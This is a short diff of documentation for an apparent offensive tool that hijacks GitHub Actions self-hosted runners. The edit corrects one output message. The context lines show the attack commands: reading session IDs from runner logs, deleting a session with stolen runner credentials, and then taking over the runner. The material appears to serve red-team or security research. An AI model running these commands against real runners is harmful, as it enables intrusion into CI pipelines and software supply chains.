@@ -61,7 +61,7 @@ root@9f8f6f1fdfa6:/actions-runner# cat _diag/* | grep -i session
 Then, you can delete the current session:
 ```sh
 $ gh-hijack-runner.py --rsa-params credentials_rsaparams.json --credentials credentials.json --runner runner.json --delete-session-id aab007e0-eedd-4c1b-96b4-a7c2c128c31a
-[+] Session aab007e0-eedd-4c1b-96b4-a7c2c128c31a.
+[+] Session aab007e0-eedd-4c1b-96b4-a7c2c128c31a deleted.
 ```
 
 Finally you can hijack this runner:
